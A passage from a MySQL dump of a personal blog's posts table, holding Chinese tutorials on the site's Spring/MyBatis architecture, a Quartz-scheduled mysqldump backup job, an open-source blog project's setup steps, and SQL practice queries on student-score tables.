技术架构\r\n\r\n- **Java后端框架：** SpringMVC、Spring、MyBatis\r\n\r\n- **前端框架：** Bootstrap、Jquery、Semantic UI\r\n\r\n- **数据库：** MySQL\r\n\r\n- **部署：** Tomcat、阿里云服务器\r\n\r\n- **模板引擎：** Thymeleaf\r\n\r\n- 前端页面还是采用上一版的模板页面（基于Semantic UI），后台模板采用 INSPINIA+ Admin Theme的模板（基于Bootstrap）\r\n\r\n​	网站核心主要采用SpringMVC、Spring和Mybatis,下图是用户访问一篇文章时，ssm框架执行流程原理，参考了[张开涛](https://www.iteye.com/blog/jinnianshilongnian-1594806)的博客文章\r\n\r\n![](https://islizx.oss-cn-hangzhou.aliyuncs.com/images/2020/2/20200229_170208_48.gif)\r\n\r\n\r\n\r\n​	**运行流程分析**\r\n\r\n1.浏览器发送请求查看一篇文章，articleid=1\r\n\r\n2.启动WEB项目容器。首先会去读取web.xml配置文件里的配置。 web.xml中标签的加载顺序：<context-param>  >  <listener> (spring的相关工作)  >  filter >servlet（springmvc的相关工作）\r\n\r\n3.spring初始化完成\r\n\r\n4.DispatcherServlet->HandlerMapping进行请求到处理的映射，HandlerMapping将“/articledetail”路径直接映射到名字为“/articledetail”的Bean进行处理，即ArticleController，返回Handler。\r\n\r\n5.如果存在自定义拦截器（比如后台需用户登录才能进行接下来的操作），则会先执行拦截器，接着返回一个执行链\r\n\r\n3.前端控制器拿着处理器映射器返回的Handler调用处理器适配器HandlerAdapter去执行Handler,HandlerAdapter处理器适配为ArticleController。\r\n\r\n7.ArticleController执行查询，取得结果集返回数据。\r\n\r\n8.前端控制器请求视图解析器ViewResolver进行视图解析，根据逻辑视图解析成真正的视图，向前端控制器返回view\r\n\r\n9.Thymeleaf（/articledetail.html）进行渲染，将在处理器传入的模型数据在视图中展示出来；\r\n10.返回响应。\r\n\r\n\r\n\r\n## 二、页面预览\r\n\r\n### 2.1 介绍几张后台的页面\r\n\r\n1.后台首页 DashBoard\r\n\r\n![](https://islizx.oss-cn-hangzhou.aliyuncs.com/images/2020/2/20200229_170208_63.png)\r\n\r\n2.文章列表\r\n\r\n![](https://islizx.oss-cn-hangzhou.aliyuncs.com/images/2020/2/20200229_170208_313.png)\r\n\r\n3.编辑文章（MarkDown编辑器）\r\n\r\n![](https://islizx.oss-cn-hangzhou.aliyuncs.com/images/2020/2/20200229_170112_354.png)\r\n\r\n4.页面管理（可以自定义页面，申请友链和留言板即为自定义页面）\r\n\r\n![](https://islizx.oss-cn-hangzhou.aliyuncs.com/images/2020/2/20200229_170209_828.png)\r\n\r\n5.附件管理（点击附件可以查看详细信息以及删除操作）\r\n\r\n![](https://islizx.oss-cn-hangzhou.aliyuncs.com/images/2020/2/20200229_170112_201.png)\r\n\r\n6.评论管理（管理员回复回收站和待审核的评论后直接通过审核并发送邮件给评论者）\r\n\r\n![](https://islizx.oss-cn-hangzhou.aliyuncs.com/images/2020/2/20200229_170208_899.png)\r\n\r\n7.日志管理\r\n\r\n![](https://islizx.oss-cn-hangzhou.aliyuncs.com/images/2020/2/20200229_170208_909.png)\r\n\r\n## 三、项目结构\r\n\r\n1.代码结构\r\n\r\n   <img src=\"https://islizx.oss-cn-hangzhou.aliyuncs.com/images/2020/2/20200229_170209_797.png\" style=\"zoom:67%;\" />\r\n\r\n2.数据库表\r\n\r\n   ![](https://islizx.oss-cn-hangzhou.aliyuncs.com/images/2020/2/20200229_170208_205.png)\r\n\r\n## 四、总结\r\n\r\n​	折腾这么久总算能够看看，如果大家发现本网站的bug，也麻烦各位在本站留言或联系博主。最后希望大家GitHub上麻烦给个star，https://github.com/isLizx/islizxBlog。\r\n\r\n## 五、更新日志\r\n\r\n- 2020-01-30至2020-02-21：项目基本完成\r\n\r\n- 2020-02-26：ICP备案信息通过\r\n\r\n- 2020-02-27：在阿里云上线\r\n\r\n- 2020-02-27：公网安备通过\r\n\r\n- 2020-02-28：配置HTTPS成功，配置quartz定时备份数据库\r\n\r\n- 2020-03-11：加入redis缓存和数据库。对首页访问频率多的数据加入缓存。对于经常更新的数据如：浏览量之类的数据先添加到redis数据库中，再通过quartz定时刷新到数据库中\r\n\r\n- 2020-03-12：将图片附件部署到阿里云OSS上\r\n  \r\n\r\n ​	​	​	​	​	​	​	 **持续更新中...**\r\n\r\n\r\n\r\n', '2020-02-29 17:18:57', '萌生开发个人博客网站的想法是因为学校毕业设计需要交一个自己开发的网站项目。加上平时遇问题到网上找答案，看到博客园、CSDN等技术博客平台的人有自己的网站着实有点羡慕', 'https://islizx.oss-cn-hangzhou.aliyuncs.com/images/2020/2/20200229_171827_770.jpg', '原创', 0, b'1', b'1', '个人网站的建立（一）建站历史和技术架构', '2020-03-12 14:41:43', 295, 54, 3, 0, 1, 0, NULL);
INSERT INTO `t_blog` VALUES (00000000000000000154, b'0', b'1', '## 一、Quartz\r\n\r\n### 1.1 核心概念\r\n\r\n- Quartz作为开源定时调度器，功能强悍，使用方便。\r\n\r\n- Quartz结构图：\r\n\r\n![](https://islizx.oss-cn-hangzhou.aliyuncs.com/images/2020/2/20200229_194319_343.png)\r\n\r\n### 1.2 主要组成部分\r\n\r\n- Job：表示一个工作，要执行的具体内容。此接口中只有一个方法\r\n\r\n```java\r\nvoid execute(JobExecutionContext context)\r\n```\r\n\r\n- JobDetail：表示一个具体的可执行的调度程序，Job是这个可执行程调度程序所要执行的内容，另外JobDetail还包含了这个任务调度的方案和策略。\r\n\r\n- Trigger：代表一个调度参数的配置，什么时候去调。\r\n\r\n- Scheduler：代表一个调度容器，一个调度容器中可以注册多个JobDetail和Trigger。当Trigger与JobDetail组合，就可以被Scheduler容器调度了。\r\n\r\n## 二、spring+quartz实现定时备份数据库数据\r\n\r\n### 	2.1 基于quartz强大的强大的调度功能，本站使用quartz来对数据库进行备份，与Spring结合\r\n\r\n### 	2.2 使用\r\n\r\n1.pom文件添加依赖包\r\n\r\n   ```java\r\n   <!-- quartz定时支持 -->\r\n   <dependency>\r\n   	<groupId>org.springframework</groupId>\r\n   	<artifactId>spring-context-support</artifactId>\r\n   	<version>4.2.0.RELEASE</version>\r\n   </dependency>\r\n   <dependency>\r\n   	<groupId>org.quartz-scheduler</groupId>\r\n   	<artifactId>quartz</artifactId>\r\n   	<version>2.2.1</version>\r\n   </dependency>\r\n   ```\r\n\r\n   \r\n\r\n2.数据库配置文件 db.properties\r\n\r\n   ```properties\r\n   #MySQL\r\n   mysql.url=jdbc:mysql://127.0.0.1:3306/blog?useUnicode=true&characterEncoding=utf8\r\n   mysql.username=root\r\n   mysql.password=123456\r\n   #将数据文件到分到哪个路径下，这里backdatabase为最后一个目录，生成的格式为blog2020-2-28 23_39_00.sql\r\n   databasePath=/usr/islizx/backdatabase/blog\r\n   #要备份的数据库\r\n   databaseName=blog\r\n   ```\r\n\r\n3.用于读取 db.properties 配置文件的类\r\n\r\n   ```java\r\n   package com.islizx.util;\r\n   \r\n   import java.io.IOException;\r\n   import java.io.InputStream;\r\n   import java.util.Properties;\r\n   \r\n   /**\r\n    * 用于读取 db.properties 配置文件\r\n    * \r\n    * @author lizx\r\n    * @date 2020-02-28 - 23:00\r\n    */\r\n   public class ConfigManager {\r\n       private static Properties props = null;\r\n       static {\r\n           InputStream is = null;\r\n           is = ConfigManager.class.getClassLoader().getResourceAsStream(\r\n                   \"db.properties\");\r\n           if (is == null)\r\n               throw new RuntimeException(\"找不到数据库参数配置文件!\");\r\n           props = new Properties();\r\n           try {\r\n               props.load(is);\r\n           } catch (IOException e) {\r\n               throw new RuntimeException(\"数据库配置参数加载错误!\", e);\r\n           } finally {\r\n               try {\r\n                   is.close();\r\n               } catch (IOException e) {\r\n                   e.printStackTrace();\r\n               }\r\n           }\r\n       }\r\n       public static String getProperty(String key) {\r\n           return props.getProperty(key);\r\n       }\r\n   }\r\n   \r\n   ```\r\n\r\n   \r\n\r\n4.备份mysql数据库的java代码 BackMySql.java\r\n\r\n   ```java\r\n   package com.islizx.util;\r\n   \r\n   import java.io.*;\r\n   import java.text.DateFormat;\r\n   import java.util.Date;\r\n   \r\n   /**\r\n    * 备份mysql数据库的java代码\r\n    * \r\n    * @author lizx\r\n    * @date 2020-02-28 - 21:11\r\n    */\r\n   public class BackMySql {\r\n       public static void exportDataBase(){\r\n   		// 根据当前时间来命名sql文件\r\n           Date now = new Date();\r\n           DateFormat df= DateFormat.getDateTimeInstance();\r\n           String dbName = df.format(now)+\".sql\";\r\n           dbName=dbName.replaceAll(\":\", \"_\");\r\n   		// 读取配置文件\r\n           String user = ConfigManager.getProperty(\"mysql.username\");\r\n           String password = ConfigManager.getProperty(\"mysql.password\");\r\n           String database = ConfigManager.getProperty(\"databaseName\");\r\n           String filepath = ConfigManager.getProperty(\"databasePath\")+dbName;\r\n   		// 备份数据库的sql语句\r\n           String stmt1 = \"mysqldump  -u \"+user+\" -p\"+password+\" --set-charset=utf8 \"+database;\r\n           try{\r\n               Process process = Runtime.getRuntime().exec(stmt1);\r\n               InputStream in = process.getInputStream();\r\n               InputStreamReader xx = new InputStreamReader(in, \"utf8\");\r\n               String inStr;\r\n               StringBuffer sb = new StringBuffer(\"\");\r\n               String outStr;\r\n               BufferedReader br = new BufferedReader(xx);\r\n               while ((inStr = br.readLine()) != null) {\r\n                   sb.append(inStr + \"\\r\\n\");\r\n               }\r\n               outStr = sb.toString();\r\n               FileOutputStream fout = new FileOutputStream(filepath);\r\n               OutputStreamWriter writer = new OutputStreamWriter(fout, \"utf8\");\r\n               writer.write(outStr);\r\n               writer.flush();\r\n               in.close();\r\n               xx.close();\r\n               br.close();\r\n               writer.close();\r\n               fout.close();\r\n           }catch(IOException e){\r\n               e.printStackTrace();\r\n           }\r\n   \r\n       }\r\n   }\r\n   \r\n   ```\r\n\r\n5.定时调度类的核心代码 TriggerImpl.java\r\n\r\n   ```java\r\n   package com.islizx.service.impl;\r\n   \r\n   import com.islizx.util.BackMySql;\r\n   \r\n   /**\r\n    * 备份数据库\r\n    * @author lizx\r\n    * @date 2020-02-28 - 23:04\r\n    */\r\n   public class TriggerImpl {\r\n       public void BackMySQL(){\r\n           BackMySql.exportDataBase();\r\n       }\r\n   }\r\n   \r\n   ```\r\n\r\n6.Spring的配置：\r\n\r\n   ```java\r\n   <bean id=\"trigger\" class=\"com.islizx.service.impl.TriggerImpl\"></bean>\r\n       <!-- 定义调用对象和调用对象的方法 -->\r\n       <bean id=\"projobtask2\" class=\"org.springframework.scheduling.quartz.MethodInvokingJobDetailFactoryBean\">\r\n           <property name=\"targetObject\">\r\n               <ref bean=\"trigger\"/>\r\n           </property>\r\n           <property name=\"targetMethod\">\r\n               <value>BackMySQL</value>\r\n           </property>\r\n       </bean>\r\n       <!--定义触发时间  -->\r\n       <bean id=\"timecard2\" class=\"org.springframework.scheduling.quartz.CronTriggerFactoryBean\">\r\n           <property name=\"jobDetail\">\r\n               <ref bean=\"projobtask2\"/>\r\n           </property>\r\n           <!-- cron表达式 -->\r\n           <property name=\"cronExpression\">\r\n               <!-- 每周一上午十点十五备份一次-->\r\n               <value>0 15 10 ? * MON</value>\r\n           </property>\r\n       </bean>\r\n       <!-- 总管理类 如果将lazy-init=\'false\'那么容器启动就会执行调度程序 -->\r\n       <bean id=\"startQuertz2\" lazy-init=\"false\" autowire=\"no\" class=\"org.springframework.scheduling.quartz.SchedulerFactoryBean\">\r\n           <property name=\"triggers\">\r\n               <list>\r\n                   <ref bean=\"timecard2\"/>\r\n               </list>\r\n           </property>\r\n       </bean>\r\n   ```\r\n\r\n## 三、总结\r\n\r\n​	数据库可以一星期完全备份一次，增量备份一天一次，事务日志备份一小时或者三十分钟一次。\r\n\r\n', '2020-02-29 19:48:36', 'spring+quartz实现定时备份sqlserver数据库数据。基于quartz强大的强大的调度功能，本站使用quartz来对数据库进行备份，与Spring结合', 'https://islizx.oss-cn-hangzhou.aliyuncs.com/images/2020/2/20200229_194722_287.jpg', '原创', 0, b'1', b'1', '个人网站的建立（二）Quartz整合Spring定时备份数据库', '2020-03-12 14:42:09', 20, 55, 3, 0, 0, 0, NULL);
INSERT INTO `t_blog` VALUES (00000000000000000155, b'0', b'1', '## 一、关于项目\r\n\r\n1.该博客是基于SSM实现的个人博客系统，适合初学SSM和个人博客制作的同学学习。主要技术架构包括Maven、SpringMVC、Spring、MyBatis、Thymeleaf等。前端采用Bootstarp和Semantic UI。\r\n2.详细介绍：https://islizx.cn/article/153.html\r\n\r\n## 二、效果预览\r\n\r\n1.预览地址：https://islizx.cn\r\n\r\n2.前台效果图就不展示了，可前往网站浏览\r\n\r\n3.介绍几张后台的页面\r\n\r\n3.1 后台首页 DashBoard\r\n\r\n![](https://islizx.oss-cn-hangzhou.aliyuncs.com/images/2020/2/20200229_170208_63.png)\r\n\r\n3.2 文章列表\r\n\r\n![](https://islizx.oss-cn-hangzhou.aliyuncs.com/images/2020/2/20200229_170208_313.png)\r\n\r\n3.3 编辑文章（MarkDown编辑器）\r\n\r\n![](https://islizx.oss-cn-hangzhou.aliyuncs.com/images/2020/2/20200229_170112_354.png)\r\n\r\n3.4 页面管理（可以自定义页面，申请友链和留言板即为自定义页面）\r\n\r\n![](https://islizx.oss-cn-hangzhou.aliyuncs.com/images/2020/2/20200229_170209_828.png)\r\n\r\n3.5 附件管理（点击附件可以查看详细信息以及删除操作）\r\n\r\n![](https://islizx.oss-cn-hangzhou.aliyuncs.com/images/2020/2/20200229_170112_201.png)\r\n\r\n3.6 评论管理（管理员回复回收站和待审核的评论后直接通过审核并发送邮件给评论者）\r\n\r\n![](https://islizx.oss-cn-hangzhou.aliyuncs.com/images/2020/2/20200229_170208_899.png)\r\n\r\n3.7 日志管理\r\n\r\n![](https://islizx.oss-cn-hangzhou.aliyuncs.com/images/2020/2/20200229_170208_909.png)\r\n\r\n## 三、使用注意\r\n\r\n1.开发工具的选择\r\n\r\n   请使用 IntelliJ IDEA, 尽量不要用 Eclipse/MyEclipse。后者可能要折腾一会儿\r\n\r\n2.确保你安装了 Maven\r\n\r\n3.请给你的IDE安装Lombok插件\r\n\r\n   实体类中多次使用到 @Data 注解，请确保你的 IDE 安装了 Lombok 插件，否则找不到 getter/setter 方法\r\n\r\n## 四、使用步骤\r\n\r\n1.Fork项目\r\n\r\n   fork或者下载项目到本地（建议先fork到自己仓库，在通过码云导入仓库下载，实测下载速度可以）。完整项目源码，可以使用IDEA导入。数据库文件请先创建数据库，然后以运行sql文件方式导入\r\n\r\n2.导入数据库\r\n\r\n   新建数据库**blog**,导入数据库blog.sql。注意，数据库的编码和排序规则是utf-8和utf-8_general_ci。数据库默认用户名 root，密码 123456\r\n\r\n3.修改项目中的数据库连接信息\r\n\r\n   修改 db.properties 文件，该文件很容易找到，在 src/main/resources 中。里面有 MySQL 数据库连接信息，请确保已安装和启动 MySQL。注意修改数据库地址、表名、用户名和密码。\r\n\r\n## 五、下载地址\r\n\r\n​	GitHub地址：https://github.com/isLizx/islizxBlog  （如果可以帮忙点一次Star和Fork）', '2020-02-29 20:30:55', '该博客是基于SSM实现的个人博客系统，适合初学SSM和个人博客制作的同学学习。主要技术架构包括Maven、SpringMVC、Spring、MyBatis、Thymeleaf等。前端采用Bootstarp和Semantic UI', 'https://islizx.oss-cn-hangzhou.aliyuncs.com/images/2020/2/20200227_203508_953.jpg', '原创', 0, b'1', b'1', '【免费开源】一个简单的Java博客系统-适合初学ssm者', '2020-03-17 16:05:03', 4863, 54, 3, 0, 0, 0, NULL);
INSERT INTO `t_blog` VALUES (00000000000000000157, b'0', b'1', '# mysql 50道经典练习题，学生——老师——课程——分数\r\n\r\n## 前言\r\n\r\n本篇文章来记录一下自己做这50道练习题遇到的问题，也算记录自己的学习记录。其实之前也有做过，只是做到一半就放弃了，这次好好来重新练习一遍。\r\n\r\n网上有很多这50道练习题的解答过程，自己有几道题做不出的时候也会去参考，但网上的许多教程只是列举了答案，没有解析。所以本篇文章会在一些难的题目下提供解题思路。\r\n\r\n## 一、练习前的数据准备\r\n\r\n1.课程信息表\r\n\r\n```sql\r\ncreate table course(Cid varchar(10),Cname nvarchar(10),Tid varchar(10));\r\ninsert into course values(\'01\' , N\'语文\' , \'02\');\r\ninsert into course values(\'02\' , N\'数学\' , \'01\');\r\ninsert into course values(\'03\' , N\'英语\' , \'03\');\r\n```\r\n\r\n   \r\n\r\n2.学生成绩表\r\n\r\n```sql\r\ncreate table sc(Sid varchar(10),Cid varchar(10),score decimal(18,1));\r\ninsert into sc values(\'01\' , \'01\' , 80);\r\ninsert into sc values(\'01\' , \'02\' , 90);\r\ninsert into sc values(\'01\' , \'03\' , 99);\r\ninsert into sc values(\'02\' , \'01\' , 70);\r\ninsert into sc values(\'02\' , \'02\' , 60);\r\ninsert into sc values(\'02\' , \'03\' , 80);\r\ninsert into sc values(\'03\' , \'01\' , 80);\r\ninsert into sc values(\'03\' , \'02\' , 80);\r\ninsert into sc values(\'03\' , \'03\' , 80);\r\ninsert into sc values(\'04\' , \'01\' , 50);\r\ninsert into sc values(\'04\' , \'02\' , 30);\r\ninsert into sc values(\'04\' , \'03\' , 20);\r\ninsert into sc values(\'05\' , \'01\' , 76);\r\ninsert into sc values(\'05\' , \'02\' , 87);\r\ninsert into sc values(\'06\' , \'01\' , 31);\r\ninsert into sc values(\'06\' , \'03\' , 34);\r\ninsert into sc values(\'07\' , \'02\' , 89);\r\ninsert into sc values(\'07\' , \'03\' , 98);\r\n```\r\n\r\n   \r\n\r\n3.学生信息表\r\n\r\n```sql\r\ncreate table student(Sid varchar(10),Sname nvarchar(10),Sage datetime,Ssex nvarchar(10))\r\ninsert into student values(\'01\' , N\'赵雷\' , \'1990-01-01\' , N\'男\');\r\ninsert into student values(\'02\' , N\'钱电\' , \'1990-12-21\' , N\'男\');\r\ninsert into student values(\'03\' , N\'孙风\' , \'1990-05-20\' , N\'男\');\r\ninsert into student values(\'04\' , N\'李云\' , \'1990-08-06\' , N\'男\');\r\ninsert into student values(\'05\' , N\'周梅\' , \'1991-12-01\' , N\'女\');\r\ninsert into student values(\'06\' , N\'吴兰\' , \'1992-03-01\' , N\'女\');\r\ninsert into student values(\'07\' , N\'郑竹\' , \'1989-07-01\' , N\'女\');\r\ninsert into student values(\'08\' , N\'王菊\' , \'1990-01-20\' , N\'女\');\r\n```\r\n\r\n   \r\n\r\n4.教师信息表\r\n\r\n```sql\r\ncreate table teacher(Tid varchar(10),Tname nvarchar(10));\r\ninsert into teacher values(\'01\' , N\'张三\');\r\ninsert into teacher values(\'02\' , N\'李四\');\r\ninsert into teacher values(\'03\' , N\'王五\');\r\n```\r\n\r\n## 二、练习题\r\n\r\n1.查询\" 01 \"课程比\" 02 \"课程成绩高的学生的信息及课程分数\r\n\r\n   先查出两个课程的所有学生成绩，利用关联条件a.sid=b.sid来达到同一学生的两门课程比较，再通过关联学生信息表获取学生信息\r\n\r\n```sql\r\nselect a.* ,b.* , c.* from (select * from sc where cid = \"01\") a left join (select * from sc where cid = \"02\") b\r\non a.sid = b.sid\r\nleft join student c\r\non a.sid = c.sid\r\nwhere a.score > b.score;\r\n```\r\n\r\n2.查询同时存在\" 01 \"课程和\" 02 \"课程的情况\r\n\r\n```sql\r\nselect a.* ,b.* from (select * from sc where cid = \"01\") a inner join (select * from sc where cid = \"02\") b\r\non a.sid = b.sid\r\n```\r\n\r\n3.查询存在\" 01 \"课程但可能不存在\" 02 \"课程的情况(不存在时显示为 null )\r\n\r\n   可能不存在02课程只能左外连接了\r\n\r\n```sql\r\nselect a.* ,b.* from (select * from sc where cid = \"01\") a left join (select * from sc where cid = \"02\") b\r\non a.sid = b.sid\r\n```\r\n\r\n4.查询不存在\" 01 \"课程但存在\" 02 \"课程的情况\r\n\r\n   可以先查出存在01课程的情况再not in\r\n\r\n```sql\r\nselect a.* from sc a where a.cid = \"02\" and a.sid not in (select sid from sc where cid = \"01\"); \r\n```\r\n\r\n5.查询平均成绩大于等于 60 分的同学的学生编号和学生姓名和平均成绩\r\n\r\n```sql\r\nselect a.sid, b.sname, avg(score) from sc a left join student b on a.sid = b.sid group by a.sid having avg(score) > 60;     \r\n```\r\n\r\n6.查询在 sc 表存在成绩的学生信息\r\n\r\n   存在成绩即为sc表中存在记录，以下有两种思路\r\n\r\n```sql\r\n#第一种\r\nselect distinct student.* from sc left join student on sc.sid = student.sid \r\n\r\n#第二种\r\nselect a.* from student a where a.sid in (select sid from sc);      \r\n```\r\n\r\n7.查询所有同学的学生编号、学生姓名、选课总数、所有课程的总成绩(没成绩的显示为 null )\r\n\r\n   编号和选课总数以及所有课程的总成绩都隐藏在sc表中，只需一个group by sid即可。至于没有成绩则需要从student表查sc表，right join student。\r\n\r\n```sql\r\nselect b.sid, b.sname, selcousum, scoresum  from (select sid, count(cid) as selcousum, sum(score) as scoresum from sc group by sid) a right join student b on a.sid = b.sid     \r\n```\r\n\r\n8.查有成绩的学生信息\r\n\r\n```sql\r\nselect distinct student.* from sc left join student on sc.sid = student.sid \r\n\r\nselect a.* from student a where a.sid in (select sid from sc);      \r\n```\r\n\r\n9.查询「李」姓老师的数量\r\n\r\n```sql\r\nselect count(tid) from teacher where tname like \"李%\";      \r\n```\r\n\r\n10.查询学过「张三」老师授课的同学的信息\r\n\r\n这题只是表关联多而已，只需将题目拆分一下即可\r\n\r\n```sql\r\nselect st.* from sc left join student st on sc.sid = st.sid where cid in (select c.cid from teacher t inner join course c on t.tid = c.tid where t.tname = \"张三\");    \r\n```\r\n\r\n11.查询没有学全所有课程的同学的信息\r\n\r\n这题思路参考第四题，反向思考。可以先查询出学全所有课程同学的sid,然后在student表中not in即可\r\n\r\n```sql\r\nselect student.* from student where student.sid not in (select sid from sc group by sid having count(cid) = (select count(cid) from course));      \r\n```\r\n\r\n12.查询至少有一门课与学号为\" 01 \"的同学所学相同的同学的信息\r\n\r\n```sql\r\nselect stu.* from student stu where sid in (select distinct sid from sc where cid in (select cid from sc where sid = \"01\"));      \r\n```\r\n\r\n13.查询和\" 01 \"号的同学学习的课程完全相同的其他同学的信息\r\n\r\n这题不会做，网上查找答案后才知道。这道题的思路就是卡在如何比较两个同学的课程是否相同。\r\n\r\n而网上的答案的思路则是换了一种。先查出一门都没选过01号同学课程的sid，not in 一下就只剩少选的和全选的。最后只要找出课程数和01号同学相等即可。\r\n\r\n```sql\r\nselect * from student where sid in (\r\nselect sid from sc where sid not in (select sid from sc where cid not in (select cid from sc where sid = \"01\")) \r\ngroup by sid having count(cid) = (select count(cid) from sc where sid = \"01\")\r\n) and sid != \"01\"      \r\n```\r\n\r\n14.查询没学过\"张三\"老师讲授的任一门课程的学生姓名\r\n\r\n```sql\r\nselect sname from student where sid not in (select distinct sid from sc where cid = (select cid from teacher t join course c on t.tid = c.tid where t.tname = \"张三\"))      \r\n```\r\n\r\n15.查询两门及其以上不及格课程的同学的学号，姓名及其平均成绩\r\n\r\n```sql\r\nselect s.sid, s.sname, avg(score) from sc inner join student s on sc.sid = s.sid where score < 60 group by sc.sid having count(sc.sid) >= 2      \r\n```\r\n\r\n16.检索\" 01 \"课程分数小于 60，按分数降序排列的学生信息\r\n\r\n```sql\r\nselect st.* from student st join sc on st.sid = sc.sid where cid = \"01\" and score < 60 order by sc.score desc      \r\n```\r\n\r\n17.按平均成绩从高到低显示所有学生的所有课程的成绩以及平均成绩\r\n\r\n```sql\r\nselect sc.*, a from (select sid, avg(score) as a from sc group by sid) r left join sc on r.sid = sc.sid order by a desc      \r\n```\r\n\r\n18.查询各科成绩最高分、最低分和平均分：\r\n\r\n```sql\r\nselect c.cname, max(score), min(score), avg(score) from course c join sc on c.cid = sc.cid group by c.cid     \r\n```\r\n\r\n19.以如下形式显示：课程 ID，课程 name，最高分，最低分，平均分，及格率，中等率，优良率，优秀率\r\n-- 及格为>=60，中等为：70-80，优良为：80-90，优秀为：>=90\r\n\r\n这是主要考察case-when-then-else-end。\r\n\r\n```sql\r\nselect c.cid as \"课程 ID\", c.cname as \"课程 name\", max(score) as \"最高分\", min(score) as \"最低分\", avg(score) as \"平均分\", \r\nsum(case when score >= 60 then 1 else 0 end)/count(distinct sid) as \"及格率\", \r\nsum(case when score>=70 and score < 80 then 1 else 0 end)/count(distinct sid) as \"中等率\", \r\nsum(case when score>=80 and score < 90 then 1 else 0 end)/count(distinct sid) as \"优良率\", \r\nsum(case when score>=90 then 1 else 0 end)/count(distinct sid) as \"优秀率\"\r\nfrom course c join sc on c.cid = sc.cid group by c.cid     \r\n```\r\n\r\n20.要求输出课程号和选修人数，查询结果按人数降序排列，若人数相同，按课程号升序排列\r\n\r\n```sql\r\nselect cid, count(sid) from sc group by cid order by count(distinct sid) desc, cid asc      \r\n```\r\n\r\n21.按各科成绩进行排序，并显示排名， score 重复时保留名次空缺\r\n\r\n这里通过自己关联自己，首先只同一门科目对比同一门科目的成绩s1.cid=s2.cid，至于排名靠查询出的次数来实现，如果s1的某门科目比某个人分数低，则排名加一（不会存在自己跟自己比的，因为成绩是相等的）。最后只需要按照每门课程分组，在按照学生分组即可\r\n\r\n```sql\r\nselect s1.cid, s1.sid, s1.score, count(s2.score)+1 as rank \r\nfrom sc s1 \r\nleft join sc s2 \r\non s1.score < s2.score and s1.cid = s2.cid\r\ngroup by s1.cid, s1.sid\r\norder by s1.cid, rank      \r\n```\r\n\r\n22.查询学生的总成绩，并进行排名，总分重复时不保留名次空缺\r\n\r\n```sql\r\nset @i = 0;\r\nselect @i := @i +1 as rank, b.sid, b.sumscore from \r\n(select sid, sum(score) as sumscore from sc group by sid) b;      \r\n```\r\n\r\n23.统计各科成绩各分数段人数：课程编号，课程名称，[100-85]，[85-70]，[70-60]，[60-0] 及所占百分比\r\n\r\n同19题\r\n\r\n```sql\r\nselect count(sid), c.cid, c.cname, \r\nsum(case when 100 >= score and score > 85 then 1 else 0 end)/(count(sid)) as \"[100-85]\",\r\nsum(case when 85 >= score and score > 70 then 1 else 0 end)/(count(sid)) as \"[85-70]\",\r\nsum(case when 70 >= score and score > 60 then 1 else 0 end)/(count(sid)) as \"[70-60]\",\r\nsum(case when 60 >= score and score >= 0 then 1 else 0 end)/(count(sid)) as \"[60-0]\"\r\nfrom sc join course c on sc.cid = c.cid group by sc.cid      \r\n```\r\n\r\n24.查询各科成绩前三名的记录\r\n\r\n由于mysql不能group by以后再去limit，所以这题没有想象中的简单。\r\n\r\n第一种方法是网上找来的，比较难以理解。找比自己分数大的记录有几条。如果小于三，即自己在前三排名中，则将自己查询出来。这样循环sc表就可查询各科成绩前三名的记录\r\n\r\n第二种是自己通过第一种理解改过来的。还是利用自己关联自己，比较后如果sc的某条记录排名前三，则select.\r\n\r\n```sql\r\nselect * from sc\r\nwhere (\r\nselect count(*) from sc as a \r\nwhere sc.cid = a.cid and sc.score<a.score \r\n)< 3\r\norder by cid asc, sc.score desc;\r\n\r\nselect s1.cid, s1.sid, s1.score from sc s1 left join sc s2 on \r\ns1.cid = s2.cid and s1.score < s2.score  \r\ngroup by s1.cid, s1.sid having count(s2.cid) < 3 order by s1.cid asc, s1.score desc;      \r\n```\r\n\r\n25.查询每门课程被选修的学生数\r\n\r\n```sql\r\nselect cid, count(sid) from sc group by cid;      \r\n```\r\n\r\n26.查询出只选修两门课程的学生学号和姓名\r\n\r\n```sql\r\nselect st.sid, sname from sc left join student st on sc.sid = st.sid group by sid having count(cid) = 2      \r\n```\r\n\r\n27.查询男生、女生人数\r\n\r\n```sql\r\nselect count(ssex) from student group by ssex      \r\n```\r\n\r\n28.查询名字中含有「风」字的学生信息\r\n\r\n```sql\r\nselect * from student where sname like \"%风%\"      \r\n```\r\n\r\n29.查询同名学生名单，并统计同名人数\r\n\r\n```sql\r\nselect count(*) from student s1 inner join student s2 on \r\ns1.sid != s2.sid and s1.sname = s2.sname \r\n\r\nselect sname, count(*) from student group by sname having count(sname) > 1       \r\n```\r\n\r\n30.查询 1990 年出生的学生名单\r\n\r\n```sql\r\nselect * from student where year(sage) = \"1990\"      \r\n```\r\n\r\n31.查询每门课程的平均成绩，结果按平均成绩降序排列，平均成绩相同时，按课程编号升序排列\r\n\r\n```sql\r\nselect cid, avg(score) from sc group by cid order by avg(score) desc, cid       \r\n```\r\n\r\n32.查询平均成绩大于等于 85 的所有学生的学号、姓名和平均成绩\r\n\r\n```sql\r\nselect st.sid, st.sname, avg(score) from sc join student st on sc.sid = st.sid group by sc.sid having avg(score) >= 85      \r\n```\r\n\r\n33.查询课程名称为「数学」，且分数低于 60 的学生姓名和分数\r\n\r\n```sql\r\nselect st.sname, sc.score from sc join student st on sc.sid = st.sid \r\njoin course c on c.cid = sc.cid where c.cname = \"数学\" and score < 60      \r\n```\r\n\r\n34.查询所有学生的课程及分数情况（存在学生没成绩，没选课的情况）\r\n\r\n```sql\r\nselect st.sid, sc.score from student st left join sc on st.sid = sc.sid       \r\n```\r\n\r\n35.查询任何一门课程成绩在 70 分以上的姓名、课程名称和分数\r\n\r\n```sql\r\nselect sname, cname, score from student st join sc on st.sid = sc.sid join \r\ncourse c on sc.cid = c.cid where score > 70      \r\n```\r\n\r\n36.查询存在不及格的课程\r\n\r\n```sql\r\nselect cid from sc group by cid having min(score) < 60      \r\n```\r\n\r\n37.查询课程编号为 01 且课程成绩在 80 分及以上的学生的学号和姓名\r\n\r\n```sql\r\nselect st.sid, st.sname from sc join student st on sc.sid = st.sid \r\nwhere cid = \"01\" and score >= 80      \r\n```\r\n\r\n38.求每门课程的学生人数\r\n\r\n```sql\r\nselect count(sid) from sc group by cid;      \r\n```\r\n\r\n39.成绩不重复，查询选修「张三」老师所授课程的学生中，成绩最高的学生信息及其成绩\r\n\r\n这个只是表关联复杂一点，这里使用max()也可以\r\n\r\n```sql\r\nselect st.*, score from sc join student st on sc.sid = st.sid,\r\n(select sid,cid from sc where cid = (select cid from teacher t join course c on t.tid = c.tid where t.tname = 